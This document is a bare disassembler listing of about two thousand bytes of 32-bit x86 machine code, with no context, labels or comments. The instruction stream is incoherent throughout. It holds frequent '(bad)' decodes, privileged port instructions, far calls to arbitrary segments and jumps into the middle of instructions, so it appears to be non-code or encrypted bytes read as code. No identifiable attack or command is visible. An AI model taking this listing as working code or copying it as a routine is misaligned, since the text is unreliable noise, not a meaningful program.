  41586b:	pop    eax
  41586c:	rcl    DWORD PTR [bx+si+0x711f],cl
  415871:	pusha  
  415872:	sub    BYTE PTR [ecx+0x7699d3f6],bh
  415878:	xchg   DWORD PTR [ebx-0x7d],eax
  41587b:	cmp    dl,BYTE PTR [ecx+edx*4-0x427ea98b]
  415882:	jo     0x41582b
  415884:	frstor [eax-0x5f47b88a]
  41588a:	xor    bl,dh
  41588c:	adc    eax,esp
  41588e:	mov    dl,0x36
  415890:	add    DWORD PTR [ecx],esi
  415892:	fcom   DWORD PTR [ecx-0xe71d250]
  415898:	cld    
  415899:	inc    edi
  41589a:	inc    esi
  41589b:	and    DWORD PTR [edi+0x1db962a1],0xad8cc97a
  4158a5:	xor    DWORD PTR [ebp-0x44],ebp
  4158a8:	leave  
  4158a9:	aas    
  4158aa:	arpl   WORD PTR [edi+0x530a65f3],bx
  4158b0:	enter  0x92cc,0xde
  4158b4:	imul   esi,DWORD PTR [edi+0x2da5baaf],0x1e
  4158bb:	or     bh,BYTE PTR [esi-0x23]
  4158be:	pop    ebx
  4158bf:	repz pop ds
  4158c1:	or     eax,0x6569930c
  4158c6:	pop    ecx
  4158c7:	or     eax,0xdc232e79
  4158cc:	test   al,0x59
  4158ce:	imul   ebx,DWORD PTR [ebx-0x65],0xffffffd8
  4158d2:	cmp    DWORD PTR ds:0x7536cfa0,esp
  4158d8:	arpl   WORD PTR [esi-0x48021e80],bx
  4158de:	(bad)  
  4158e0:	pop    ss
  4158e1:	and    al,0xd5
  4158e3:	mov    edi,0xeed7ffc9
  4158e8:	fnsave [edx]
  4158ea:	mov    esi,esp
  4158ec:	das    
  4158ed:	add    eax,0xa99f58e4
  4158f2:	cmp    al,dl
  4158f4:	add    eax,0xe840d546
  4158f9:	jae    0x415955
  4158fb:	repz add dh,BYTE PTR [ebx-0x1c]
  4158ff:	adc    dl,dl
  415901:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415903:	les    eax,FWORD PTR [edx-0x26]
  415906:	adc    esp,DWORD PTR [edx+eiz*2+0x5b]
  41590a:	jae    0x41595c
  41590c:	cmp    DWORD PTR [ebx+0x791e2efc],esp
  415912:	(bad)  [ebp+ebp*4-0x26b21547]
  415919:	and    DWORD PTR [edx+0x19],ebx
  41591c:	pop    ebp
  41591d:	cmc    
  41591e:	and    al,0xd0
  415920:	push   ss
  415921:	loopne 0x415925
  415923:	leave  
  415924:	mov    DWORD PTR [esi+0x38],0x861aad2e
  41592b:	je     0x415949
  41592d:	pusha  
  41592e:	fmul   QWORD PTR [esp+edx*4-0xe]
  415932:	and    BYTE PTR [edx],dl
  415934:	jp     0x41595f
  415936:	pop    ds
  415937:	aad    0x1e
  415939:	pushf  
  41593a:	and    ah,BYTE PTR [edx+0x1694e084]
  415940:	ins    DWORD PTR es:[edi],dx
  415941:	data16 out dx,al
  415943:	cmp    bl,dl
  415945:	cmc    
  415946:	adc    BYTE PTR [eax],0x9a
  415949:	pusha  
  41594a:	mov    ?,WORD PTR [ecx]
  41594c:	cld    
  41594d:	in     eax,0xfd
  41594f:	inc    ecx
  415950:	test   eax,0xddd389db
  415955:	adc    al,0xc6
  415957:	adc    al,0x2f
  415959:	enter  0x896f,0x44
  41595d:	daa    
  41595e:	sbb    eax,0x9177c876
  415963:	add    DWORD PTR ss:[edi+0x4f],edi
  415967:	jle    0x415935
  415969:	daa    
  41596a:	loop   0x415947
  41596c:	bound  eax,QWORD PTR ss:[ecx]
  41596f:	call   0xf823:0x9384d6fc
  415976:	retf   0xa3f7
  415979:	cmp    ecx,ecx
  41597b:	daa    
  41597c:	ror    BYTE PTR [edx+0x2d430ebf],0x29
  415983:	dec    ecx
  415984:	xchg   edx,eax
  415985:	xchg   BYTE PTR [esi-0x9],ah
  415988:	inc    esp
  415989:	sbb    BYTE PTR [eax],dh
  41598b:	pop    eax
  41598c:	xor    ch,BYTE PTR [eax-0x36f81240]
  415992:	and    DWORD PTR es:[eax],ebx
  415995:	mov    ecx,0xb7dc2621
  41599a:	lahf   
  41599b:	lods   eax,DWORD PTR ds:[esi]
  41599c:	aam    0x2b
  41599e:	fwait
  41599f:	inc    esi
  4159a0:	jno    0x41596b
  4159a2:	xor    eax,0x6879ec95
  4159a7:	retf   0x3ae9
  4159aa:	(bad)  
  4159ab:	mov    ds:0xd36b6db1,eax
  4159b0:	(bad)  
  4159b1:	shl    BYTE PTR [esi+0xc],1
  4159b4:	into   
  4159b5:	ins    BYTE PTR es:[edi],dx
  4159b6:	scas   al,BYTE PTR es:[edi]
  4159b7:	mov    eax,ds:0xca3c257d
  4159bc:	mov    esi,0x2598aa55
  4159c1:	inc    edx
  4159c2:	jbe    0x415a10
  4159c4:	add    bh,ch
  4159c6:	mov    ch,0x6a
  4159c8:	jge    0x415a2b
  4159ca:	popa   
  4159cb:	mov    ah,0x64
  4159cd:	push   0xffffff86
  4159cf:	imul   ebp,DWORD PTR ds:0x76b44930,0x9fe3af34
  4159d9:	ds jno 0x415973
  4159dc:	pop    ebx
  4159dd:	mov    dl,0x8
  4159df:	mov    WORD PTR [edi+0x5d],gs
  4159e2:	push   ebp
  4159e3:	cdq    
  4159e4:	inc    edi
  4159e5:	and    dl,BYTE PTR [edx-0x1a]
  4159e8:	inc    eax
  4159e9:	addr16 jmp 0x4159c1
  4159ec:	jne    0x415a22
  4159ee:	stc    
  4159ef:	dec    edi
  4159f0:	mov    edi,0x96a66f3a
  4159f5:	aas    
  4159f6:	mov    ah,0x96
  4159f8:	cmp    eax,0x7c7d931e
  4159fd:	xchg   esi,eax
  4159fe:	mov    esp,0xd5776ae8
  415a03:	(bad)  [ecx-0x3d591bb4]
  415a09:	sub    eax,0xe9dce5a8
  415a0e:	inc    ebx
  415a0f:	cmp    DWORD PTR [ecx-0x247b9354],ecx
  415a15:	in     al,dx
  415a16:	push   0xb0b9a7f3
  415a1b:	pop    ds
  415a1c:	or     DWORD PTR [ecx+0x2d52ce44],eax
  415a22:	lods   eax,DWORD PTR ds:[esi]
  415a23:	es sti 
  415a25:	out    dx,al
  415a26:	xchg   BYTE PTR [ebx],dl
  415a28:	mov    ch,0x59
  415a2a:	add    bl,dh
  415a2c:	sub    DWORD PTR [ebx],ecx
  415a2e:	int3   
  415a2f:	jmp    0x1b45fe5f
  415a34:	pop    edx
  415a35:	jg     0x415a08
  415a37:	shl    DWORD PTR [esi-0x2bc049f9],1
  415a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a3f:	lods   al,BYTE PTR ds:[esi]
  415a40:	inc    eax
  415a41:	sbb    BYTE PTR [eax],al
  415a43:	arpl   WORD PTR [esi],bp
  415a45:	inc    ebx
  415a46:	add    dl,BYTE PTR gs:[ebx-0x5fea86cb]
  415a4d:	inc    edx
  415a4e:	dec    esp
  415a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a50:	adc    esi,DWORD PTR [eax]
  415a52:	pop    ecx
  415a53:	clc    
  415a54:	mov    dh,BYTE PTR [ebx-0x46]
  415a57:	xor    al,BYTE PTR [eax+0x65]
  415a5a:	lahf   
  415a5b:	push   0xd6344d31
  415a60:	icebp  
  415a61:	xchg   edi,eax
  415a62:	pop    esi
  415a63:	mov    ah,0x5e
  415a65:	jnp    0x415a9b
  415a67:	out    dx,al
  415a68:	shl    DWORD PTR [ebx-0x7],1
  415a6b:	das    
  415a6c:	in     eax,0x8
  415a6e:	dec    edx
  415a6f:	cs pop ebx
  415a71:	jge    0x415ab2
  415a73:	addr16 jl 0x415a50
  415a76:	out    0xa1,al
  415a78:	inc    ecx
  415a79:	jle    0x415a97
  415a7b:	scas   al,BYTE PTR es:[edi]
  415a7c:	xor    dl,cl
  415a7e:	(bad)  
  415a7f:	sar    DWORD PTR [eax],1
  415a81:	arpl   WORD PTR [eax],bx
  415a83:	mov    eax,0x927c7b0e
  415a88:	mov    edi,0x9e4801a8
  415a8d:	cmp    eax,0xe3795868
  415a92:	imul   esi,DWORD PTR [esi-0x2d],0xffffffb1
  415a96:	lds    edx,FWORD PTR [edx-0x22c334ac]
  415a9c:	in     al,dx
  415a9d:	lds    esp,FWORD PTR [edx-0x45f40e3e]
  415aa3:	push   ebp
  415aa4:	bound  ebp,QWORD PTR ds:0xe831e2a3
  415aaa:	mov    al,0xa1
  415aac:	or     ebx,DWORD PTR fs:[ecx+0x6c]
  415ab0:	das    
  415ab1:	fiadd  DWORD PTR [esi+0x6fdf2625]
  415ab7:	lock (bad) [esi]
  415aba:	sbb    ecx,DWORD PTR [ebx-0x5e]
  415abd:	cs jl  0x415a97
  415ac0:	sub    BYTE PTR [ecx],dl
  415ac2:	jp     0x415ab1
  415ac4:	xor    esi,DWORD PTR [esi-0x7d452d30]
  415aca:	xchg   DWORD PTR ds:0xded3420b,edi
  415ad0:	add    eax,0xcf7dc09a
  415ad5:	push   ebp
  415ad6:	jbe    0x415b18
  415ad8:	sub    DWORD PTR [ebx],ecx
  415ada:	stos   DWORD PTR es:[edi],eax
  415adb:	dec    esp
  415adc:	push   ebx
  415add:	fmul   QWORD PTR [ecx+0x37]
  415ae0:	lahf   
  415ae1:	adc    al,BYTE PTR [edi]
  415ae3:	add    al,0x68
  415ae6:	xor    eax,0x6b915ff1
  415aeb:	mov    dh,0xf3
  415aed:	out    0x50,eax
  415aef:	jnp    0x415b48
  415af1:	enter  0xd7f7,0x62
  415af5:	in     al,dx
  415af6:	fist   WORD PTR [edi]
  415af8:	sub    BYTE PTR [edx+ebp*4],dl
  415afb:	mov    eax,0x27c92129
  415b00:	xchg   ebx,eax
  415b01:	in     al,0x4e
  415b03:	out    dx,eax
  415b04:	sbb    eax,0xaa79cdad
  415b09:	adc    esp,edx
  415b0b:	out    0x28,al
  415b0d:	and    al,0xea
  415b0f:	shl    BYTE PTR [edi],cl
  415b11:	adc    bh,cl
  415b13:	ss mov al,0x6f
  415b16:	jns    0x415ab5
  415b18:	fst    DWORD PTR [eax]
  415b1a:	leave  
  415b1b:	xchg   edx,eax
  415b1c:	bound  ebp,QWORD PTR [edx-0x28de65a1]
  415b22:	xchg   ecx,eax
  415b23:	xchg   DWORD PTR [ebx],edi
  415b25:	ret    
  415b26:	mov    ebp,0xac7700b6
  415b2b:	inc    edx
  415b2c:	mov    ah,0x4f
  415b2e:	mov    ds:0x4fc3710d,eax
  415b33:	dec    edi
  415b34:	or     eax,0xe2c2965c
  415b39:	out    0xa0,al
  415b3b:	enter  0xa2fa,0xdc
  415b3f:	in     eax,dx
  415b40:	mov    ecx,0x5286a96b
  415b45:	mov    edx,eax
  415b47:	adc    ebp,ebp
  415b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b4a:	lock leave 
  415b4c:	(bad)  
  415b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b4e:	pop    ds
  415b4f:	xchg   DWORD PTR [ebx+0x1b],eax
  415b52:	mov    dh,0x8c
  415b54:	pop    esp
  415b55:	xchg   ecx,eax
  415b56:	in     al,dx
  415b57:	xchg   edi,eax
  415b58:	cli    
  415b59:	mov    al,0x6a
  415b5b:	gs cli 
  415b5d:	inc    ebx
  415b5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b5f:	jo     0x415b63
  415b61:	jg     0x415b08
  415b63:	jne    0x415b1e
  415b65:	adc    ebx,DWORD PTR [esp+edx*1+0x5c]
  415b69:	adc    BYTE PTR [edx+edx*1],ah
  415b6c:	jecxz  0x415bb9
  415b6e:	or     DWORD PTR [ebp+edx*8-0x6c],esi
  415b72:	sub    DWORD PTR [ecx-0x79af0e76],esp
  415b78:	loope  0x415b5b
  415b7a:	out    0xe1,al
  415b7c:	mov    bl,0x6b
  415b7e:	jo     0x415b8b
  415b80:	or     ecx,DWORD PTR [ecx+0x75555cc9]
  415b86:	dec    esi
  415b87:	and    al,0x62
  415b89:	les    ebp,FWORD PTR [esi-0x1b]
  415b8c:	inc    ebx
  415b8d:	addr16 jae 0x415b92
  415b90:	out    dx,eax
  415b91:	jp     0x415bc1
  415b93:	ds mov cl,0xde
  415b96:	cld    
  415b97:	loopne 0x415bfb
  415b99:	pushf  
  415b9a:	inc    edx
  415b9b:	aad    0x98
  415b9d:	aas    
  415b9e:	inc    eax
  415b9f:	or     ebp,DWORD PTR [esi-0x25]
  415ba2:	xchg   esp,eax
  415ba3:	lock int 0xcd
  415ba6:	sahf   
  415ba7:	adc    al,0x7
  415ba9:	aas    
  415baa:	lock in al,0xa8
  415bad:	(bad)  
  415bae:	push   ecx
  415baf:	jne    0x415c09
  415bb1:	add    DWORD PTR [ecx+0x4d],edx
  415bb4:	(bad)  
  415bb5:	shr    BYTE PTR [esi],1
  415bb7:	jns    0x415b79
  415bb9:	pop    esp
  415bba:	sbb    cl,BYTE PTR [edi+0x366dff9f]
  415bc0:	enter  0xa8ef,0x38
  415bc4:	dec    edi
  415bc5:	shl    BYTE PTR [eax],1
  415bc7:	xor    al,0xa
  415bc9:	(bad)  
  415bca:	(bad)
  415bce:	push   ecx
  415bcf:	sahf   
  415bd0:	pushf  
  415bd1:	add    bl,BYTE PTR [esi+eiz*2-0x3780a31]
  415bd8:	mov    dh,0x78
  415bda:	scas   al,BYTE PTR es:[edi]
  415bdb:	dec    ebx
  415bdc:	jb     0x415b6e
  415bde:	add    DWORD PTR [ecx-0x60],eax
  415be1:	pop    es
  415be2:	jne    0x415c07
  415be4:	cdq    
  415be5:	inc    ebx
  415be6:	retf   
  415be7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415be8:	sbb    al,0x92
  415bea:	dec    ebp
  415beb:	aam    0xbb
  415bed:	ret    
  415bee:	sub    BYTE PTR [edx],dh
  415bf0:	fnstsw WORD PTR [ebp+0x2980af50]
  415bf6:	div    BYTE PTR [ebx+0x7f]
  415bf9:	xor    esp,eax
  415bfb:	aam    0x4c
  415bfd:	xchg   ebp,eax
  415bfe:	dec    ebp
  415bff:	adc    cl,BYTE PTR [edx-0x66]
  415c02:	sub    DWORD PTR [eax+0x4c],ebp
  415c05:	sub    BYTE PTR [ebx],0x17
  415c08:	int    0x47
  415c0a:	pop    edx
  415c0b:	mov    esi,0x358875f0
  415c10:	(bad)  
  415c11:	cmp    al,0xe4
  415c13:	int3   
  415c14:	inc    eax
  415c15:	repnz mov ecx,0xee9e6d62
  415c1b:	inc    edi
  415c1c:	scas   eax,DWORD PTR es:[edi]
  415c1d:	(bad)  
  415c1e:	and    DWORD PTR [ebx+0x33],eax
  415c21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c22:	ja     0x415c6d
  415c24:	jmp    0x4f93:0x2507c3a0
  415c2b:	push   ebx
  415c2c:	nop
  415c2d:	xor    DWORD PTR [edx+0x20af8411],ecx
  415c33:	jecxz  0x415c83
  415c35:	mov    cs,WORD PTR [esi-0x64]
  415c38:	je     0x415c0a
  415c3a:	sti    
  415c3b:	push   cs
  415c3c:	dec    esp
  415c3d:	popf   
  415c3e:	or     DWORD PTR [eax+eiz*8],ebx
  415c41:	fwait
  415c42:	and    DWORD PTR [ecx+edi*2-0x20],esi
  415c46:	sar    DWORD PTR [eax],cl
  415c48:	mov    bh,0xd6
  415c4a:	cld    
  415c4b:	xchg   esi,eax
  415c4c:	dec    ecx
  415c4d:	cmp    bl,BYTE PTR [edx]
  415c4f:	out    dx,eax
  415c50:	xchg   ebx,eax
  415c51:	outs   dx,DWORD PTR ds:[esi]
  415c52:	test   BYTE PTR ds:[edi-0x53],bl
  415c56:	xchg   BYTE PTR [ecx+0x79],al
  415c59:	es hlt 
  415c5b:	enter  0x137b,0x80
  415c5f:	aam    0xb2
  415c61:	cmp    BYTE PTR [edi-0x56879b30],ah
  415c67:	sub    DWORD PTR [esi-0x2e],eax
  415c6a:	jg     0x415cb9
  415c6c:	sbb    BYTE PTR [edx],ah
  415c6e:	pop    ebx
  415c6f:	and    ah,BYTE PTR [ebx-0x3b4a8270]
  415c75:	sbb    al,0x16
  415c77:	or     DWORD PTR [ebp+0x1140edcd],0x13ff01ec
  415c81:	push   ecx
  415c82:	cwde   
  415c83:	xlat   BYTE PTR ds:[ebx]
  415c84:	jno    0x415c93
  415c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c87:	sub    DWORD PTR [eax-0x6054e99d],edx
  415c8d:	cwde   
  415c8e:	cmp    BYTE PTR [ebx],bl
  415c90:	and    ebp,0x88515cd3
  415c96:	cmp    bh,BYTE PTR gs:[ebx+0x4c03ecb]
  415c9d:	in     eax,dx
  415c9e:	dec    ebx
  415c9f:	cmp    eax,0xb494b9c6
  415ca4:	fisub  WORD PTR [ebp+0x7c]
  415ca7:	cmp    dh,al
  415ca9:	out    dx,al
  415caa:	call   0xa9033dbd
  415caf:	retf   
  415cb0:	imul   ecx,ebx,0xf58d10d0
  415cb6:	in     eax,dx
  415cb7:	push   esp
  415cb8:	enter  0xf71b,0xa8
  415cbc:	sub    BYTE PTR [eax*2+0x2319d630],bl
  415cc3:	ins    DWORD PTR es:[edi],dx
  415cc4:	icebp  
  415cc5:	imul   edi,DWORD PTR [ebx+edx*8],0xe
  415cc9:	xor    al,0x6d
  415ccb:	icebp  
  415ccc:	inc    edi
  415ccd:	push   es
  415cce:	sub    DWORD PTR [eax-0x6659c680],esp
  415cd4:	ss hlt 
  415cd6:	addr16 (bad) 
  415cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cd9:	dec    esp
  415cda:	jge    0x415c78
  415cdc:	jo     0x415d5d
  415cde:	mov    cl,0xc3
  415ce0:	in     al,0x36
  415ce2:	cmp    cl,bh
  415ce4:	mov    dl,0x6c
  415ce6:	and    DWORD PTR [edx-0xc474e6b],eax
  415cec:	cdq    
  415ced:	fadd   QWORD PTR [eax+eax*4-0x3d7179db]
  415cf4:	cmp    ch,BYTE PTR es:[esi+0x7]
  415cf8:	jno    0x415d6d
  415cfa:	push   edx
  415cfb:	jge    0x415cf3
  415cfd:	pop    es
  415cfe:	inc    ebp
  415cff:	je     0x415cc7
  415d01:	cdq    
  415d02:	in     eax,0x22
  415d04:	cmp    DWORD PTR [ebx+0x39],eax
  415d07:	enter  0x50db,0x98
  415d0b:	pop    edx
  415d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d0d:	js     0x415cf1
  415d0f:	scas   al,BYTE PTR es:[edi]
  415d10:	or     eax,0x1116ce78
  415d15:	loop   0x415d93
  415d17:	pop    ecx
  415d18:	add    BYTE PTR [ebx-0x77c6230c],bl
  415d1e:	test   al,0x14
  415d20:	add    eax,0xadcf4fc4
  415d25:	fsubr  QWORD PTR [ecx]
  415d27:	out    0xa9,eax
  415d29:	fld    TBYTE PTR [ecx]
  415d2b:	repz fidivr WORD PTR [edx-0x6]
  415d2f:	jne    0x415d77
  415d31:	and    al,0x3a
  415d33:	cmp    ah,al
  415d35:	xchg   ebp,eax
  415d36:	sbb    edx,ecx
  415d38:	aaa    
  415d39:	add    esi,esp
  415d3b:	sbb    ecx,DWORD PTR [ecx]
  415d3d:	mov    esp,0x4ca8030e
  415d42:	adc    DWORD PTR [edx+0x1b],esp
  415d45:	nop
  415d46:	enter  0xf69a,0x86
  415d4a:	xor    bl,dh
  415d4c:	xlat   BYTE PTR ds:[ebx]
  415d4d:	mov    cl,0x3b
  415d4f:	mov    ah,0x94
  415d51:	in     eax,0xd2
  415d53:	mov    BYTE PTR [eax-0x1c8489fb],bl
  415d59:	pop    es
  415d5a:	or     ebp,DWORD PTR ds:0x1e061417
  415d60:	arpl   WORD PTR [eax],bp
  415d62:	inc    ecx
  415d63:	pop    esp
  415d64:	in     eax,dx
  415d65:	sbb    al,0x2f
  415d67:	jb     0x415d36
  415d69:	push   ebp
  415d6a:	add    al,BYTE PTR [edi+ebx*8+0x23b9e914]
  415d71:	fsubr  DWORD PTR [eax-0x6bf3bf5a]
  415d77:	mov    ds,WORD PTR [ebx-0x5d3c490a]
  415d7d:	aad    0xcc
  415d7f:	adc    eax,0xe39c0f42
  415d84:	enter  0xb4a1,0x2a
  415d88:	add    eax,0x902d9299
  415d8d:	ret    
  415d8e:	inc    BYTE PTR [edx+edx*8]
  415d91:	sub    al,0x4d
  415d93:	pop    ebx
  415d94:	lea    esp,[edi]
  415d96:	sub    bh,BYTE PTR [ecx-0x69]
  415d99:	cmc    
  415d9a:	arpl   WORD PTR [eax],si
  415d9c:	gs mov esp,0x24d629ff
  415da2:	mov    WORD PTR [ecx+ebp*4+0x6a],?
  415da6:	ins    DWORD PTR es:[edi],dx
  415da7:	add    eax,0xdaa89da2
  415dac:	inc    eax
  415dad:	(bad)  
  415dae:	jle    0x415d61
  415db0:	jge    0x415d76
  415db2:	push   ecx
  415db3:	or     esp,DWORD PTR [ebx]
  415db5:	jne    0x415d99
  415db7:	and    eax,0x4def88a7
  415dbc:	lahf   
  415dbd:	lea    esi,[edx]
  415dbf:	(bad)  
  415dc0:	pop    esi
  415dc1:	rcl    DWORD PTR [edi+eax*4],cl
  415dc4:	jb     0x415da5
  415dc6:	mov    cl,0xd6
  415dc8:	add    al,0x83
  415dcb:	fsubr  DWORD PTR [ebp-0xacfde1a]
  415dd1:	jae    0x415d8f
  415dd3:	jb     0x415d6e
  415dd5:	test   eax,0x307b055f
  415dda:	fdivr  QWORD PTR [esi+0x7d]
  415ddd:	sub    BYTE PTR [esi-0x6e],dh
  415de0:	pop    edi
  415de1:	pushf  
  415de2:	xlat   BYTE PTR ds:[ebx]
  415de3:	test   eax,0xd50dacbe
  415de9:	push   edx
  415dea:	jmp    0x563c8c46
  415def:	shl    BYTE PTR [ecx],cl
  415df1:	pop    esi
  415df2:	xor    BYTE PTR [esi+0x3c0497a5],bh
  415df8:	repnz dec ebp
  415dfa:	xchg   esp,eax
  415dfb:	sub    esi,DWORD PTR [ebx]
  415dfd:	mov    bl,0xf0
  415dff:	ficomp DWORD PTR [ebx-0xb]
  415e02:	pop    esi
  415e03:	in     eax,dx
  415e04:	mov    bh,0xe4
  415e06:	addr16 pop ss
  415e08:	xchg   ecx,eax
  415e09:	push   es
  415e0a:	enter  0xf622,0xc9
  415e0e:	mov    ds:0xcf4d976f,eax
  415e13:	or     eax,0x2b041fcb
  415e18:	cmp    cl,BYTE PTR ds:0xaa7cef75
  415e1e:	xor    bl,BYTE PTR [ebx-0xbfd9719]
  415e24:	in     al,dx
  415e25:	into   
  415e26:	push   ebp
  415e27:	repz mov es,WORD PTR [edx-0x14]
  415e2b:	lds    esi,FWORD PTR [ecx-0x1291e226]
  415e31:	icebp  
  415e32:	fidivr DWORD PTR [ecx]
  415e34:	push   0x7
  415e36:	dec    ebp
  415e37:	shr    BYTE PTR [edx+edi*4-0x437b5419],0x20
  415e3f:	pop    ecx
  415e40:	dec    edx
  415e41:	xchg   BYTE PTR [esi+0xbf00899],ah
  415e47:	jne    0x415e25
  415e49:	not    BYTE PTR [eax+0x1b]
  415e4c:	les    ebx,FWORD PTR [bx-0x21]
  415e50:	push   ss
  415e51:	js     0x415dd8
  415e53:	lods   eax,DWORD PTR ds:[esi]
  415e54:	jno    0x415e17
  415e56:	xchg   edx,eax
  415e57:	fcom   DWORD PTR [ebp+0x223cd1fe]
  415e5d:	pop    ecx
  415e5e:	pop    esp
  415e5f:	jae    0x415e5f
  415e61:	stos   BYTE PTR es:[edi],al
  415e62:	in     eax,dx
  415e63:	dec    esp
  415e64:	mov    BYTE PTR [eax+0x4a],al
  415e67:	scas   al,BYTE PTR es:[edi]
  415e68:	lahf   
  415e69:	pop    ebx
  415e6a:	xor    DWORD PTR [ebx-0x7f],edx
  415e6d:	mov    WORD PTR [edi+0x4c],fs
  415e70:	mov    WORD PTR [edx+edx*2-0x7f],ss
  415e74:	sbb    eax,0xf66ecf1
  415e79:	(bad)
  415e7c:	and    DWORD PTR [edx+0x4f643a95],esp
  415e82:	dec    edi
  415e83:	cdq    
  415e84:	rol    DWORD PTR gs:[esi+0x78c0823f],1
  415e8b:	pop    DWORD PTR [ecx+0x51]
  415e8e:	test   eax,0x8971062f
  415e93:	dec    esp
  415e94:	outs   dx,BYTE PTR ds:[esi]
  415e95:	jg     0x415f08
  415e97:	repz mov cl,ch
  415e9a:	push   ebx
  415e9b:	sub    ecx,DWORD PTR [eax+ecx*1+0x53c13dec]
  415ea2:	ret    0xfea2
  415ea5:	ror    DWORD PTR [edi-0x25e503d5],1
  415eab:	adc    eax,0x47e44cc9
  415eb0:	jmp    0x415ed4
  415eb2:	xchg   edi,eax
  415eb3:	int    0x93
  415eb5:	adc    edi,ebp
  415eb7:	out    dx,eax
  415eb8:	cmp    DWORD PTR [edx+0x4339276],edi
  415ebe:	test   edi,edx
  415ec0:	stc    
  415ec1:	and    DWORD PTR [edi+edi*1],ecx
  415ec4:	push   eax
  415ec5:	nop
  415ec6:	call   0xaf676c0
  415ecb:	xor    al,0x3d
  415ecd:	enter  0xd484,0x2e
  415ed1:	mov    ch,0x80
  415ed3:	addr16 aas 
  415ed5:	ror    DWORD PTR [eax-0x1d4aef98],0x7a
  415edc:	in     al,dx
  415edd:	ds push 0x907b2b39
  415ee3:	mov    edi,0x8c35b599
  415ee8:	inc    esi
  415ee9:	jne    0x415f0a
  415eeb:	out    dx,eax
  415eec:	lods   eax,DWORD PTR ds:[esi]
  415eed:	inc    ebx
  415eee:	push   ss
  415eef:	xchg   esi,eax
  415ef0:	sbb    eax,0x64de051d
  415ef5:	cmp    al,0x58
  415ef7:	cmp    DWORD PTR [ebp+0x27],ecx
  415efa:	cwde   
  415efb:	repnz lock repnz inc esp
  415eff:	je     0x415eb1
  415f01:	jmp    0x415eca
  415f03:	pop    ebx
  415f04:	daa    
  415f05:	fs jp  0x415f7a
  415f08:	and    DWORD PTR gs:[bp-0x65],edx
  415f0d:	jl     0x415f43
  415f0f:	pop    ebx
  415f10:	jno    0x415ea1
  415f12:	and    eax,0xb776199c
  415f17:	ins    BYTE PTR es:[edi],dx
  415f18:	pusha  
  415f19:	mov    ch,0xb4
  415f1b:	push   edx
  415f1c:	addr16 pop edx
  415f1e:	jo     0x415eaa
  415f20:	mov    cl,0xe8
  415f22:	or     DWORD PTR [edx-0x61],ecx
  415f25:	dec    ecx
  415f26:	rol    DWORD PTR [ebx],cl
  415f28:	sbb    BYTE PTR ds:0x45f34d72,al
  415f2e:	xchg   esi,eax
  415f2f:	pop    ebp
  415f30:	loope  0x415f4f
  415f32:	repz rol BYTE PTR [ecx-0x7d5dbde],0x70
  415f3a:	int    0x59
  415f3c:	or     al,0xd7
  415f3e:	scas   al,BYTE PTR es:[edi]
  415f3f:	cmp    al,0xef
  415f41:	adc    eax,0xf79ea1bd
  415f46:	aam    0x32
  415f48:	fmul   st(2),st
  415f4a:	or     ebx,DWORD PTR [eax]
  415f4c:	pop    ds
  415f4d:	inc    ebp
  415f4e:	gs inc esp
  415f50:	push   ds
  415f51:	inc    ecx
  415f52:	xchg   esp,eax
  415f53:	jo     0x415ef6
  415f55:	sbb    eax,0xc7e819c6
  415f5a:	pop    edi
  415f5b:	sub    BYTE PTR [ebp-0x50],dl
  415f5e:	aam    0x6e
  415f60:	xor    BYTE PTR [ecx],dh
  415f62:	push   edx
  415f63:	xchg   edx,eax
  415f64:	cdq    
  415f65:	pop    esp
  415f66:	adc    al,0x26
  415f68:	test   BYTE PTR [ebx+ebx*4],cl
  415f6b:	pop    ebp
  415f6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f6d:	call   0x9512:0xc4d6867c
  415f74:	js     0x415f66
  415f76:	mov    WORD PTR [ebx],?
  415f78:	dec    eax
  415f79:	div    DWORD PTR [ebx]
  415f7b:	imul   esp,esi,0x27
  415f7e:	imul   esp,edi,0xebd5c993
  415f84:	pusha  
  415f85:	or     DWORD PTR [esp+ebx*4],eax
  415f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f89:	aam    0x73
  415f8b:	dec    ecx
  415f8c:	mov    dl,0x29
  415f8e:	rcr    DWORD PTR [ebp+0x45111589],0xe0
  415f95:	push   eax
  415f96:	js     0x415f35
  415f98:	test   al,0x10
  415f9a:	push   edx
  415f9b:	repz mov edx,0x6c0dfab
  415fa1:	lock int 0x50
  415fa4:	sahf   
  415fa5:	push   0xffffffb9
  415fa7:	push   ss
  415fa8:	mov    al,0x8a
  415faa:	cmc    
  415fab:	push   esp
  415fac:	sub    al,BYTE PTR [ecx+edx*8]
  415faf:	(bad)  
  415fb0:	jns    0x415ff7
  415fb2:	lods   al,BYTE PTR ds:[esi]
  415fb3:	mov    ds:0xefa3fd00,eax
  415fb8:	cmc    
  415fb9:	rol    DWORD PTR [ecx-0x5003d3e0],1
  415fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fc0:	or     eax,0x6a4e1535
  415fc5:	xchg   edi,eax
  415fc6:	outs   dx,DWORD PTR ds:[esi]
  415fc7:	stc    
  415fc8:	jg     0x415fcc
  415fca:	jo     0x415f72
  415fcc:	ss mov al,cl
  415fcf:	pushf  
  415fd0:	nop
  415fd1:	js     0x416011
  415fd3:	mov    ch,0x82
  415fd5:	pop    ds
  415fd6:	pop    ebx
  415fd7:	in     eax,dx
  415fd8:	sbb    eax,0x94afdb40
  415fdd:	aam    0x94
  415fdf:	scas   eax,DWORD PTR es:[edi]
  415fe0:	outs   dx,DWORD PTR ds:[esi]
  415fe1:	jle    0x415fc5
  415fe3:	fldl2t 
  415fe5:	jns    0x416065
  415fe7:	aaa    
  415fe8:	xchg   ebx,eax
  415fe9:	mov    dh,BYTE PTR [ecx-0x2e]
  415fec:	mov    esp,0x9a719f4b
  415ff1:	loope  0x415ffc
